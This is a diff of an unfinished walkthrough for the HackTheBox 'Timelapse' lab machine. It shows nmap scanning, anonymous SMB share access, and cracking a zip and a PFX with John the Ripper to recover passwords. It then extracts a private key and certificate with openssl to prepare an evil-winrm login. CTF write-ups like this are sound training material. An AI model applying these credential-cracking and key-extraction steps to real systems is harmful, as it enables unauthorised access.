@@ -2,7 +2,7 @@
 A guide for the [Timelapse Challenge in HackTheBox](https://app.hackthebox.com/machines/Timelapse)
 
 
-1. Run [Nmap](https://nmap.org/) ``` sudo nmap -sV -O -Pn -v 10.10.11.152 ```
+1. Run [Nmap](https://nmap.org/) ``` sudo nmap -sV -O -Pn -v 10.10.11.152 ```<br>
 
 > <ul>
 >    <li>-sV: Probe open ports to determine service/version info</li>
@@ -68,7 +68,7 @@ Nmap done: 1 IP address (1 host up) scanned in 27.69 seconds
            Raw packets sent: 2067 (94.656KB) | Rcvd: 29 (1.848KB)
 ```
 
-2. Exploiting the [Samba Server](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)
+2. Exploiting the [Samba Server](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)<br>
   <ul><li>Try to connect and list down the shares in the smbclient
 
 > <ul>
@@ -93,7 +93,7 @@ do_connect: Connection to 10.10.11.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT
 Unable to connect with SMB1 -- no workgroup available
 ```
 </li>
-  <li> Now that we know some sharenames on the target, let's try connnecting to them
+  <li> Now that we know some sharenames on the target, let's try connnecting to them and see what files we can find
   
   ```
       elrond@kali  ~/Downloads/HackTheBox  smbclient -N \\\\10.10.11.152\\Shares\\
@@ -124,8 +124,7 @@ Unable to connect with SMB1 -- no workgroup available
 
 ```
 elrond@kali  ~/Downloads/HackTheBox/Timelapse  zip2john winrm_backup.zip > timelapse.txt
-```
-```
+    
 Created directory: /home/elrond/.john
 ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8
 ```
@@ -133,8 +132,7 @@ ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_c
 
 ```
 elrond@kali  ~/Downloads/HackTheBox/Timelapse  john timelapse.txt --wordlist=/usr/share/wordlists/rockyou.txt
-```
-```
+
 Using default input encoding: UTF-8
 Loaded 1 password hash (PKZIP [32/64])
 Will run 4 OpenMP threads
@@ -143,15 +141,56 @@ supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)
 1g 0:00:00:00 DONE (2022-03-31 02:08) 4.166g/s 14472Kp/s 14472Kc/s 14472KC/s surkerior..superkebab
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
-
 ```
   </li>
   </ul>
 
 
-4. Decrypting
-   Now that we have Figured out the password which is ```supremelegacy``` we can now unzip the file, showing a PFX file ```legacyy_dev_auth.pfx``` 
+4. Decrypting The file<br>
+   Now that we have Figured out the password which is *supremelegacy* we can now unzip the file, showing a PFX file ```legacyy_dev_auth.pfx``` 
   which contains the SSL certificate (public keys) and the corresponding private keys of who we presume is a *Developer(Dev)* with the username *legacyy*.
-  However accessing the file would prompt another password.
+  However accessing the file would need us to provide another password to access it, hence we must send it again to *John The Ripper* via pfx2john
+  ```
+  elrond@kali  ~/Downloads/HackTheBox/Timelapse  pfx2john legacyy_dev_auth.pfx > keys.txt                 
+  ```
+  ```
+  elrond@kali  ~/Downloads/HackTheBox/Timelapse  ls                                      
+  keys.txt  legacyy_dev_auth.pfx  timelapse.txt  winrm_backup.zip
+  ```
+  ```
+  elrond@kali  ~/Downloads/HackTheBox/Timelapse  john keys.txt --wordlist=/usr/share/wordlists/rockyou.txt
+  Using default input encoding: UTF-8
+  Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 AVX 4x])
+  Cost 1 (iteration count) is 2000 for all loaded hashes
+  Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
+  Will run 4 OpenMP threads
+  Press 'q' or Ctrl-C to abort, almost any other key for status
+  thuglegacy       (legacyy_dev_auth.pfx)     
+  1g 0:00:01:31 DONE (2022-03-31 02:44) 0.01098g/s 35484p/s 35484c/s 35484C/s thuglife06..thug211
+  Use the "--show" option to display all of the cracked passwords reliably
+  Session completed. 
+  ```
+  here we figure out that the password is *thuglegacy*, and we can now access the file. but what now? utlizing a search engine we discover what we can extract from it. 
+  ![timelapse2](https://user-images.githubusercontent.com/101177396/161009781-0923574b-279b-46bc-bbaa-4ee062230147.PNG)
+  Luckily it also shows how to extract it
+  
+  
+
+  ```
+  elrond@kali  ~/Downloads/HackTheBox/Timelapse  openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out prv.key    
+  Enter Import Password:
+  Enter PEM pass phrase:
+  Verifying - Enter PEM pass phrase:
+   elrond@kali  ~/Downloads/HackTheBox/Timelapse  ls
+  keys.txt  legacyy_dev_auth.pfx  prv.key  timelapse.txt  winrm_backup.zip
+   elrond@kali  ~/Downloads/HackTheBox/Timelapse  openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt 
+  Enter Import Password:
+   elrond@kali  ~/Downloads/HackTheBox/Timelapse  ls  
+  cert.crt  keys.txt  legacyy_dev_auth.pfx  prv.key  timelapse.txt  winrm_backup.zip
+
+  ```
+  Since the we're trying top execute a file with another file on a separate folder(and we might do so again in the future),
+  we're going to create an alias for it in our shell(bash/zsh/fsh depends on your default shell)
+  ```alias evil-winrm="ruby ~/Documents/github \directories/evil-winrm/evil-winrm.rb"```
   
 5. 
